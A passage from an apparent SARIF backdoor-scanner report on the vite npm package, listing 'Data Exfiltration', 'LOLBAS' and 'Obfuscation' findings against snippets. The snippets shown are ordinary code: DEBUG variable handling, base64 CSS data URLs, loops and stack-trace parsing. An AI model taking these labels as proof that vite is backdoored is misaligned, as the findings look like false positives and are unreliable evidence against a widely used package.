                    "text": "  if (filterIndex > 0) {\n    const filter = process.argv[filterIndex + 1]\n    if (filter && !filter.startsWith('-')) {\n      process.env.VITE_DEBUG_FILTER = filter\n    }\n  }\n}\n",
                    "rendered": {
                      "text": "  if (filterIndex > 0) {\n    const filter = process.argv[filterIndex + 1]\n    if (filter && !filter.startsWith('-')) {\n      process.env.VITE_DEBUG_FILTER = filter\n    }\n  }\n}\n",
                      "markdown": "`  if (filterIndex > 0) {\n    const filter = process.argv[filterIndex + 1]\n    if (filter && !filter.startsWith('-')) {\n      process.env.VITE_DEBUG_FILTER = filter\n    }\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 24,
                  "endLine": 37,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n",
                    "rendered": {
                      "text": "      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n",
                      "markdown": "`      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n",
                    "rendered": {
                      "text": "      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n",
                      "markdown": "`      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n  if (filterIndex > 0) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 2,
                  "endLine": 36,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      .map((v) => `vite:${v}`)\n      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n",
                    "rendered": {
                      "text": "      .map((v) => `vite:${v}`)\n      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n",
                      "markdown": "`      .map((v) => `vite:${v}`)\n      .join(',')\n  }\n  process.env.DEBUG = `${\n    process.env.DEBUG ? process.env.DEBUG + ',' : ''\n  }${value}`\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 600,
                  "startColumn": 33,
                  "endLine": 600,
                  "endColumn": 39,
                  "snippet": {
                    "text": "  }\n\n  if (!stmt.uri) {\n    return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n      node: atRule,\n    })\n  }\n",
                    "rendered": {
                      "text": "  }\n\n  if (!stmt.uri) {\n    return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n      node: atRule,\n    })\n  }\n",
                      "markdown": "`  }\n\n  if (!stmt.uri) {\n    return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n      node: atRule,\n    })\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 547,
                  "startColumn": 35,
                  "endLine": 547,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    }\n\n    if (!stmt.uri) {\n      return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n        node: atRule,\n      })\n    }\n",
                    "rendered": {
                      "text": "    }\n\n    if (!stmt.uri) {\n      return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n        node: atRule,\n      })\n    }\n",
                      "markdown": "`    }\n\n    if (!stmt.uri) {\n      return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n        node: atRule,\n      })\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 536,
                  "startColumn": 37,
                  "endLine": 536,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      }\n\n      if (!node.nodes?.[0]?.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n",
                    "rendered": {
                      "text": "      }\n\n      if (!node.nodes?.[0]?.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n",
                      "markdown": "`      }\n\n      if (!node.nodes?.[0]?.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 37,
                  "endLine": 518,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      }\n\n      if (!node.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n",
                    "rendered": {
                      "text": "      }\n\n      if (!node.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n",
                      "markdown": "`      }\n\n      if (!node.value) {\n        return result.warn(`Unable to find uri in '${atRule.toString()}'`, {\n          node: atRule,\n        })\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 506,
                  "startColumn": 9,
                  "endLine": 506,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  let supports;\n\n  for (let i = 0; i < params.length; i++) {\n    const node = params[i];\n\n    if (node.type === \"space\" || node.type === \"comment\") continue\n\n",
                    "rendered": {
                      "text": "  let supports;\n\n  for (let i = 0; i < params.length; i++) {\n    const node = params[i];\n\n    if (node.type === \"space\" || node.type === \"comment\") continue\n\n",
                      "markdown": "`  let supports;\n\n  for (let i = 0; i < params.length; i++) {\n    const node = params[i];\n\n    if (node.type === \"space\" || node.type === \"comment\") continue\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 358,
                  "startColumn": 39,
                  "endLine": 358,
                  "endColumn": 45,
                  "snippet": {
                    "text": "function contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n  if (plainDataURLRegexp.test(url)) {\n",
                    "rendered": {
                      "text": "function contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n  if (plainDataURLRegexp.test(url)) {\n",
                      "markdown": "`function contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n  if (plainDataURLRegexp.test(url)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 357,
                  "startColumn": 22,
                  "endLine": 357,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\nfunction contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n",
                    "rendered": {
                      "text": "\nfunction contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n",
                      "markdown": "`\nfunction contents(url) {\n  if (base64DataURLRegexp.test(url)) {\n    // \"data:text/css;base64,\".length === 21\n    return Buffer.from(url.slice(21), \"base64\").toString()\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 348,
                  "startColumn": 45,
                  "endLine": 348,
                  "endColumn": 51,
                  "snippet": {
                    "text": "var readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\nfunction isValid(url) {\n",
                    "rendered": {
                      "text": "var readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\nfunction isValid(url) {\n",
                      "markdown": "`var readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\nfunction isValid(url) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 347,
                  "startColumn": 46,
                  "endLine": 347,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\nvar readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\n",
                    "rendered": {
                      "text": "\nvar readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\n",
                      "markdown": "`\nvar readCacheExports = readCache$1.exports;\n\nconst anyDataURLRegexp = /^data:text\\/css(?:;(base64|plain))?,/i;\nconst base64DataURLRegexp = /^data:text\\/css;base64,/i;\nconst plainDataURLRegexp = /^data:text\\/css;plain,/i;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 7,
                  "endLine": 67,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n      condition.media,\n",
                    "rendered": {
                      "text": "\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n      condition.media,\n",
                      "markdown": "`\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n      condition.media,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-CHbHjMYU.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 29,
                  "endLine": 66,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  )}`;\n\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n",
                    "rendered": {
                      "text": "  )}`;\n\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n",
                      "markdown": "`  )}`;\n\n  for (const condition of conditions) {\n    params = `'data:text/css;base64,${Buffer.from(`@import ${params}`).toString(\n      \"base64\",\n    )}' ${formatImportPrelude$1(\n      condition.layer,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-IQS-Za7F.js"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 3,
                  "endLine": 335,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  var i, max, node, result;\n\n  for (i = 0, max = nodes.length; i < max; i += 1) {\n    node = nodes[i];\n    if (!bubble) {\n      result = cb(node, i, nodes);\n    }\n",
                    "rendered": {
                      "text": "  var i, max, node, result;\n\n  for (i = 0, max = nodes.length; i < max; i += 1) {\n    node = nodes[i];\n    if (!bubble) {\n      result = cb(node, i, nodes);\n    }\n",
                      "markdown": "`  var i, max, node, result;\n\n  for (i = 0, max = nodes.length; i < max; i += 1) {\n    node = nodes[i];\n    if (!bubble) {\n      result = cb(node, i, nodes);\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 810,
                  "startColumn": 3,
                  "endLine": 810,
                  "endColumn": 7,
                  "snippet": {
                    "text": "  const name = error.name || \"Error\", message = error.message || \"\", errorString = `${name}: ${message}`, state = { nextPosition: null, curPosition: null }, processedStack = [];\n  for (let i = stack.length - 1; i >= 0; i--)\n    processedStack.push(`\n    at ${wrapCallSite(stack[i], state)}`), state.nextPosition = state.curPosition;\n  return state.curPosition = state.nextPosition = null, errorString + processedStack.reverse().join(\"\");\n}\nfunction enableSourceMapSupport(runtime) {\n",
                    "rendered": {
                      "text": "  const name = error.name || \"Error\", message = error.message || \"\", errorString = `${name}: ${message}`, state = { nextPosition: null, curPosition: null }, processedStack = [];\n  for (let i = stack.length - 1; i >= 0; i--)\n    processedStack.push(`\n    at ${wrapCallSite(stack[i], state)}`), state.nextPosition = state.curPosition;\n  return state.curPosition = state.nextPosition = null, errorString + processedStack.reverse().join(\"\");\n}\nfunction enableSourceMapSupport(runtime) {\n",
                      "markdown": "`  const name = error.name || \"Error\", message = error.message || \"\", errorString = `${name}: ${message}`, state = { nextPosition: null, curPosition: null }, processedStack = [];\n  for (let i = stack.length - 1; i >= 0; i--)\n    processedStack.push(`\n    at ${wrapCallSite(stack[i], state)}`), state.nextPosition = state.curPosition;\n  return state.curPosition = state.nextPosition = null, errorString + processedStack.reverse().join(\"\");\n}\nfunction enableSourceMapSupport(runtime) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 733,
                  "startColumn": 73,
                  "endLine": 733,
                  "endColumn": 77,
                  "snippet": {
                    "text": "    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n",
                    "rendered": {
                      "text": "    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n",
                      "markdown": "`    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 733,
                  "startColumn": 23,
                  "endLine": 733,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n",
                    "rendered": {
                      "text": "    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n",
                      "markdown": "`    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\nfunction CallSiteToString() {\n  let fileName, fileLocation = \"\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 731,
                  "startColumn": 16,
                  "endLine": 731,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      line: +match[3],\n      column: +match[4] - 1\n    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\n",
                    "rendered": {
                      "text": "      line: +match[3],\n      column: +match[4] - 1\n    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\n",
                      "markdown": "`      line: +match[3],\n      column: +match[4] - 1\n    });\n    return `eval at ${match[1]} (${position.source}:${position.line}:${position.column + 1})`;\n  }\n  return match = /^eval at ([^(]+) \\((.+)\\)$/.exec(origin), match ? `eval at ${match[1]} (${mapEvalOrigin(match[2])})` : origin;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 723,
                  "startColumn": 20,
                  "endLine": 723,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  return position;\n}\nfunction mapEvalOrigin(origin) {\n  let match = /^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(origin);\n  if (match) {\n    const position = mapSourcePosition({\n      name: null,\n",
                    "rendered": {
                      "text": "  return position;\n}\nfunction mapEvalOrigin(origin) {\n  let match = /^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(origin);\n  if (match) {\n    const position = mapSourcePosition({\n      name: null,\n",
                      "markdown": "`  return position;\n}\nfunction mapEvalOrigin(origin) {\n  let match = /^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(origin);\n  if (match) {\n    const position = mapSourcePosition({\n      name: null,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 175,
                  "startColumn": 156,
                  "endLine": 175,
                  "endColumn": 160,
                  "snippet": {
                    "text": "  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n",
                    "rendered": {
                      "text": "  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n",
                      "markdown": "`  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 175,
                  "startColumn": 65,
                  "endLine": 175,
                  "endColumn": 69,
                  "snippet": {
                    "text": "  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n",
                    "rendered": {
                      "text": "  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n",
